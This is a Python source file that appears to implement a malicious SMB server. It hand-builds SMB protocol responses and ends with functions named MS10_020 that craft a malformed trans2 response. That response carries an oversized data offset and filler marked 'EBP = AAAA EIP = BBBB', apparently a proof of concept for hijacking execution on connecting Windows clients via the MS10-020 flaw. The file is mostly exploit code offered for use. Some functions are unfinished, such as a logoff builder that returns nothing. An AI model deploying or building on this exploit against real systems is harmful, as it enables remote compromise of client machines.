import netbios
def toolkit_smb_header(disassembled_smb_header, smb_command):
        smb_header=""
        smb_header=smb_header+"\xff\x53\x4d\x42"                        # SMB command tree
        smb_header=smb_header+smb_command
        smb_header=smb_header+"\x00\x00\x00\x00"                        # NT Status 0x00000000 = STATUS_SUCCESS
        smb_header=smb_header+"\x98"                                    # Flags 1
        smb_header=smb_header+disassembled_smb_header["flags2"]
        smb_header=smb_header+"\x00\x00"                                # Process ID High
        smb_header=smb_header+"\x00\x00\x00\x00\x00\x00\x00\x00"        # Signature
        smb_header=smb_header+"\x00\x00"                                # Reserved
        smb_header=smb_header+disassembled_smb_header["tree_id"]
        smb_header=smb_header+disassembled_smb_header["process_id"]
	smb_header=smb_header+disassembled_smb_header["user_id"]
	smb_header=smb_header+disassembled_smb_header["multiplex_id"]
	return smb_header

def toolkit_negotiate_response():
	negotiate_proto_response = (
		"\x11"					# Word count
		"\x05\x00"				# Dialect index 5: NT LM 0.12
		"\x03"					# security mode
		"\x0a\x00"				# Max Mpx count
		"\x01\x00"				# Max VCs
		"\x04\x11\x00\x00"			# Max buffer size 4356
		"\x00\x00\x01\x00"			# Max raw buffer size 65536
		"\x00\x00\x00\x00"			# Session key
		"\xfd\xe3\x00\x80"			# Capabilities
		"\x00\x00\x00\x00\x00\x00\x00\x00"	# System time
		"\x00\x00"				# Server time zone
		"\x00"					# Key length
		"\x10\x00"				# Byte count (BCC)
		"\x00\x00\x00\x00\x00\x00\x00\x00"	# Server GUID
		"\x00\x00\x00\x00\x00\x00\x00\x00"	# Server GUID
	)
	return negotiate_proto_response
def toolkit_trans2_response():
        trans2_proto_response = (
                "\x00\x00\x00"                                  # object name not found ;)
        )
        return trans2_proto_response
def toolkit_session_setup_andx_response():
	session_setup_andx_response = (
		"\x04"									# Word count = 4
		"\xff"									# AndXCommand = no further commands
		"\x00"									# Reserved
		"\x75\x00"								# AndXOffset 117
		"\x01\x00"								# Action = 0x0001
		"\x00\x00"								# Security blob = 0
		"\x4a\x00"								# Byte count
		"\x57\x00\x69\x00\x6e\x00\x64\x00\x6f\x00"				# Native OS Windows 5.1
		"\x77\x00\x73\x00\x20\x00\x35\x00\x2e\x00\x31\x00\x00\x00"		# Native OS Windows 5.1
		"\x57\x00\x69\x00\x6e\x00\x64\x00\x6f\x00"				# Native lan manager: Windows 2000 Lan Manager
		"\x77\x00\x73\x00\x20\x00\x32\x00\x30\x00\x30\x00\x30\x00\x20\x00"	# Native lan manager: Windows 2000 Lan Manager
		"\x4c\x00\x41\x00\x00\x4e\x00\x20\x00\x4d\x00\x61\x00\x6e\x00\x61\x00"	# Native lan manager: Windows 2000 Lan Manager
		"\x67\x00\x65\x00\x72\x00\x00"						# Native lan manager: Windows 2000 Lan Manager
	)
	return session_setup_andx_response


def toolkit_tree_connect_andx_response():
	tree_connect_andx_response = (
		"\x07"			# Word count = 7
		"\xff"			# AndXCommand: No further commands
		"\x00"			# Reserved
		"\x38\x00"		# AndXOffset = 56
		"\x01\x00"		# optional support (exclusive search bits supported, share isn't in Dfs)
		"\xff\x01"		# word parameters
		"\x00\x00"		# word parameters
		"\xff\x01"		# word parameters
		"\x00\x00"		# word parameters
		"\x07\x00"		# Byte count = 7
		"\x49\x50\x43\x00"	# Service = IPC
		"\x00\x00\x00"		# Extra byte parameters
	)
	return tree_connect_andx_response

def toolkit_nt_create_andx_response(toolkit_nt_create_andx_response):
	nt_create_andx_response = (
		"\x2a"					# Word count = 42
		"\xff"					# \xff = No further commands
		"\x00"					# Reserved = 00
		"\x00\x00"				# AndXOffset = 135
		"\x00"					# no oplock granted
		"\x7d\x15"				# FID (This will be persistant for some time)
		"\x01\x00\x00\x00"			# file existed and was opened
		"\x00\x00\x00\x00\x00\x00\x00\x00"	# T create; in all the following fields i have not specified a timestamp which worked.
		"\x00\x00\x00\x00\x00\x00\x00\x00"	# T last access
		"\x00\x00\x00\x00\x00\x00\x00\x00"      # T last write
		"\x00\x00\x00\x00\x00\x00\x00\x00"      # T change
		"\x20\x00\x00\x00"			# file attribs
		"\x00\x00\x00\x00\x00\x00\x00\x00"	# Allocation size = 0
		"\x00\x00\x00\x00\x00\x00\x00\x00"	# EOF
		"\x02\x00"				# file type = disk file or directory
		"\xff\x05"				# IPC state
		"\x00"					# Not a directory
		"\x00\x00"					# Byte count = 0
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
		"\xff\x01\x1f\x00\x00\x9b\x01\x12\x00\x00\x00"
	)
	return nt_create_andx_response

def toolkit_tree_disconnect_response():
	tree_disconnect_response = (
		"\x00"		# Word count
		"\x00\x00"	# Byte count
	)
	return tree_disconnect_response

def toolkit_logoff_andx_response():
	logoff_andx_response = (
		"\x02\xff\x00\x27\x00\x00\x00"
	)
	return logoff_andx_response



def disassemble_header(smb_part):
	dis_smb_header = {}
	dis_smb_header["server_component"] = smb_part[0:4]
	dis_smb_header["smb_command"] = smb_part[4]
	dis_smb_header["nt_status"] = smb_part[5:9]
	dis_smb_header["flags1"] = smb_part[9]
	dis_smb_header["flags2"] = smb_part[10:12]
	dis_smb_header["process_id_high"] = smb_part[12:14]
	dis_smb_header["signature"] = smb_part[14:22]
	dis_smb_header["reserved"] = smb_part[22:24]
	dis_smb_header["tree_id"] = smb_part[24:26]
	dis_smb_header["process_id"] = smb_part[26:28]
	dis_smb_header["user_id"] = smb_part[28:30]
	dis_smb_header["multiplex_id"] = smb_part[30:32]
	return dis_smb_header

def disassemble_tree_connect_andx_request(tree_con_andx_req_part):
	disassembled_tree_connect_andx_request = {} #+12
	disassembled_tree_connect_andx_request["WCT"] = tree_con_andx_req_part[0]
	disassembled_tree_connect_andx_request["AndXCommand"] = tree_con_andx_req_part[1]
	disassembled_tree_connect_andx_request["path"] = tree_con_andx_req_part[12:]
	return disassembled_tree_connect_andx_request

## This part are a set of functions which will actually create entire packages


def close_response(disassembled_netbios_part, disassembled_smb_header):
        close_smb_header = toolkit_smb_header(disassembled_smb_header, "\x04")
        close_inner = "\x00\x00\x00"
        close_netbios = netbios.toolkit(close_smb_header+close_inner)
        close_response = close_netbios+close_smb_header+close_inner
        return close_response

def generate_trans2_response(disassembled_netbios_part, disassembled_smb_header):
        trans2_smb_header = toolkit_smb_header(disassembled_smb_header, "\x32")
        trans2_inner = toolkit_trans2_response()
        trans2_netbios = netbios.toolkit(trans2_smb_header+trans2_inner)
        trans2Response = trans2_netbios+trans2_smb_header+trans2_inner
	return trans2Response

def generate_nego_proto_resp(disassembled_netbios_part, disassembled_smb_header):
	nsponse_smb_header = toolkit_smb_header(disassembled_smb_header, "\x72")
	nsponse_nsponse = toolkit_negotiate_response()
	nsponse_netbios = netbios.toolkit(nsponse_smb_header+nsponse_nsponse)
	negoResponse = nsponse_netbios+nsponse_smb_header+nsponse_nsponse
	return negoResponse

def generate_session_setup_andx_response(disassembled_netbios_part, disassembled_smb_header):
	session_setup_andx_response_smb_header = toolkit_smb_header(disassembled_smb_header, "\x73")
	session_setup_andx_response = toolkit_session_setup_andx_response()
	session_setup_andx_response_netbios = netbios.toolkit(session_setup_andx_response_smb_header+session_setup_andx_response)
	return session_setup_andx_response_netbios+session_setup_andx_response_smb_header+session_setup_andx_response

def generate_tree_connect_andx_response(disassembled_netbios_part, disassembled_smb_header):
	tree_con_andxsponse_smb_header = toolkit_smb_header(disassembled_smb_header, "\x75")
	tree_con_andxsponse_nsponse = toolkit_tree_connect_andx_response()
	# cmd=negotiate; flags; tree_id=65535; process_id=65270; user_id=0x0000; multiplex_id=0x0000
	# user_id = not mistake; multiplex_id = multiplex_id last packet, this is just a guess
	tree_con_andxsponse_netbios = netbios.toolkit(tree_con_andxsponse_smb_header+tree_con_andxsponse_nsponse)
	tree_con_andxsponse = tree_con_andxsponse_netbios+tree_con_andxsponse_smb_header+tree_con_andxsponse_nsponse
	return tree_con_andxsponse
def generate_tree_disconnect_response(disassembled_netbios_part, disassembled_smb_header):
	tree_disconnect_response_smb_header = toolkit_smb_header(disassembled_smb_header, "\x71")
	tree_disconnect_response = toolkit_tree_disconnect_response()
	tree_con_andxsponse_netbios = netbios.toolkit(tree_disconnect_response_smb_header+tree_disconnect_response)
	return tree_con_andxsponse_netbios+tree_disconnect_response_smb_header+tree_disconnect_response
def generate_logoff_andx_response(disassembled_netbios_part, disassembled_smb_header):
	logoff_andx_response_smb_header = toolkit_smb_header(disassembled_smb_header, "\x74")
	logoff_andx_response = toolkit_logoff_andx_response()
	logoff_andx_response_netbios = netbios.toolkit(logoff_andx_response_smb_header+logoff_andx_response)

def generate_nt_create_andx_response(disassembled_netbios_part, disassembled_smb_header, disassembled_tree_connect_andx_request):
        nt_create_andx_smb_header = toolkit_smb_header(disassembled_smb_header, "\xa2")
        nt_create_andx_response = toolkit_nt_create_andx_response(disassembled_tree_connect_andx_request)
        nt_create_andx_netbios = netbios.toolkit(nt_create_andx_smb_header+nt_create_andx_response)
        return nt_create_andx_netbios+nt_create_andx_smb_header+nt_create_andx_response
def MS10_020():
        MS10_020 = (
        "\x0a"          # Word count
        "\x02\x00"      # Total parameter count
        "\x18\x00"      # Total data count
        "\x00\x00"      # reserved
        "\x02\x00"      # parameter count
        "\x38\x00"      # parameter offset
        "\x00\x00"      # parameter displacement
        "\x18\x00"      # Data count
        "\xff\xff"      # Data offset
        "\x00\x00"      # Data displacement
        "\x00"          # Setup count
        "\x00"          # Reserved
        "\x1f\x00"      # Byte count
        "\x00\x00\x00\x00\x00\x00\x10\x00\x00\x41\x42\x43\x44\x45\x46\x47\x48\x49\x50\x51\x52\x53\x54\x55\x56\x02\x61AAAABBBB"#EBP = AAAA EIP = BBBB
        )
        return MS10_020

def generate_MS10_020(disassembled_netbios_part, disassembled_smb_header):
        MS10_020_smb_header = toolkit_smb_header(disassembled_smb_header, "\x32")
        MS10_020_inner = MS10_020()
        MS10_020_netbios = netbios.toolkit(MS10_020_smb_header+MS10_020_inner)
        return MS10_020_netbios+MS10_020_smb_header+MS10_020_inner
